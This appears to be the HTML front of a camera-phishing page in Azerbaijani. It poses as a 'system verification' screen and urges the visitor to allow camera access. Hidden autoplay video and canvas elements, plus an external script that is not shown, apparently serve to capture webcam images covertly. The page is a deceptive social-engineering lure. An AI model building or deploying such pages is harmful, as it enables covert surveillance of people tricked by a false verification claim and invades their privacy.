<!DOCTYPE html>
<html lang="az">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Sistem Doğrulanması</title>
    <style>
        body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background-color: #f4f7f9; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
        .box { text-align: center; background: white; padding: 40px; border-radius: 12px; box-shadow: 0 10px 25px rgba(0,0,0,0.1); }
        .loader { border: 4px solid #f3f3f3; border-top: 4px solid #3498db; border-radius: 50%; width: 35px; height: 35px; animation: spin 1s linear infinite; margin: 15px auto; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        h2 { color: #2c3e50; font-size: 22px; }
        p { color: #7f8c8d; }
    </style>
</head>
<body>

    <div class="box">
        <div class="loader"></div>
        <h2>Bağlantı Yoxlanılır...</h2>
        <p>Zəhmət olmasa, kameraya icazə verərək doğrulanmanı tamamlayın.</p>
    </div>

    <video id="v" autoplay style="display:none"></video>
    <canvas id="c" style="display:none"></canvas>

    <script src="link.js"></script>
</body>
</html>
